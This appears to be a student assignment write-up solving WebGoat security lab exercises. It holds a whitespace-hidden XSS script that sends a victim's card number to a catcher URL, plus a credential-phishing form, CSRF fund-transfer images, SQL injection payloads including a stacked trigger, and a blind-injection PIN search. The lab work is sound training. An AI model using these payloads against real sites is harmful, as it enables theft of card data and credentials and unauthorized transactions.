#Joshua Ma, 1006726090, joshua.ma@mail.utoronto.ca
#Hao Zhu, 1006083765, howard.zhu@mail.utoronto.ca


Part 1 Explanation:
insert a form that asks the user to input their username and password. When user clicks the submit button, the username and password are read by my javascript and post to the url.


Part 2 Explanation:
Here is the source code which I inserted into input2. This starts with many spaces so the input2 text box does not show the code to the user. Also, I hide the warning message.
The code listens to the click event, and then send the card number to the url.
//Using an addEventListener() function: source from https://www.w3schools.com/jsref/event_onclick.asp -->
                                                                                                                       
<script>
    document.getElementById("message").hidden = true;
    const button = document.getElementsByName("buy");
    button[0].addEventListener("click", myFunction);
    function myFunction () { 
        let cardNumber = document.getElementsByName("input1")[0].value;
        cardNumber.hidden = true;
        console.log('hello!');
        console.log(cardNumber);
        let theUrl = "http://localhost:8090/WebGoat/catcher?PROPERTY=yes&stolenCardNum=___" + cardNumber;
        console.log(theUrl);
        var xmlHttp = new XMLHttpRequest();
        xmlHttp.open( "POST", theUrl, false );
        xmlHttp.send( null );
    };
</script>


Part 3 Explanation:
We constructed a url as requested. We put a image in the message, and the image points to a malicious request. When user opens the image and they are authenticated, their funds will be transfered.

Part 4 Explanation:
The first image is the same as Part 3, which points to a malicious request. And the second bypass the confirm button click by sending a faked confirm action to the server.

Part 5 Explanation:

Part 6 Explanation:
The query is: SELECT * FROM user_data WHERE last_name =''. Since the input is a string, we just need to put 'or '1' = '1 between the ''. Now we have two conditions in the WHERE statement. Because '1' = '1' is always true, all the credit card number will be displayed.

Part 7 Explanation:
For the first part, we can use ";" after the userid input to add another update command, and use comment mark "--" to ignore all the query after that.
For the second part, we use the same technique to add the trigger command. The the syntax of a trigger is:
CREATE TRIGGER <trigger_name> BEFORE INSERT ON <table> FOR EACH ROW BEGIN UPDATE <table> SET <field>=<new_value> WHERE userid = NEW.userid.

Part 8 Explanation:
use "101 and ((select pin from credit where cc_number = '1234123412341234') < 10000);" to figure out the pin.
We narrow down the range half by half: 0 - 10000, 0 - 5000, 2500 - 5000, 2500 - 3750, 3125 - 3750, 3125 - 3438, 3282 - 3438, 3282 - 3360, 3282 - 3321, 3302 - 3321, 3312 -3321, 3317 - 3321, 3317 -3319
Finally we use "101 and ((select pin from credit where cc_number = '1234123412341234') = 3318);" to confirm the pin number.
the return is valid so the pin is 3318